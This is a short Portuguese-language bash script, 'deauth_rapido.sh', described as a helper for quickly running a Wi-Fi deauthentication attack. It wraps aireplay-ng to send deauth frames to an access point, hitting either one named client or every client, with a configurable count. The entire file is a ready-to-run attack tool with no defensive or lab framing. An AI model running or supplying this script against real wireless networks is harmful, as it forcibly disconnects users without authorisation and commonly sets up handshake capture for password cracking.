#!/bin/bash

################################################################################
# Script auxiliar para executar ataque deauth rapidamente
# Uso: sudo ./deauth_rapido.sh [BSSID] [INTERFACE] [CLIENT_MAC]
################################################################################

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Verificar root
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[!] Execute como root (sudo)${NC}"
    exit 1
fi

# Parâmetros
BSSID="$1"
INTERFACE="$2"
CLIENT_MAC="$3"
DEAUTH_COUNT="${4:-10}"

# Verificar parâmetros
if [[ -z "$BSSID" || -z "$INTERFACE" ]]; then
    echo -e "${YELLOW}Uso: sudo ./deauth_rapido.sh [BSSID] [INTERFACE] [CLIENT_MAC] [COUNT]${NC}"
    echo -e "${YELLOW}Exemplo: sudo ./deauth_rapido.sh 34:CE:00:7F:91:E0 wlan0mon FF:EE:DD:CC:BB:AA 10${NC}"
    exit 1
fi

# Construir comando
if [[ -n "$CLIENT_MAC" ]]; then
    echo -e "${BLUE}[*] Atacando cliente específico: $CLIENT_MAC${NC}"
    echo -e "${GREEN}[+] Executando deauth...${NC}"
    echo -e "${CYAN}Comando: aireplay-ng --deauth $DEAUTH_COUNT -a $BSSID -c $CLIENT_MAC $INTERFACE${NC}\n"
    aireplay-ng --deauth $DEAUTH_COUNT -a "$BSSID" -c "$CLIENT_MAC" "$INTERFACE"
else
    echo -e "${YELLOW}[*] Atacando todos os clientes do AP${NC}"
    echo -e "${GREEN}[+] Executando deauth...${NC}"
    echo -e "${CYAN}Comando: aireplay-ng --deauth $DEAUTH_COUNT -a $BSSID $INTERFACE${NC}\n"
    aireplay-ng --deauth $DEAUTH_COUNT -a "$BSSID" "$INTERFACE"
fi

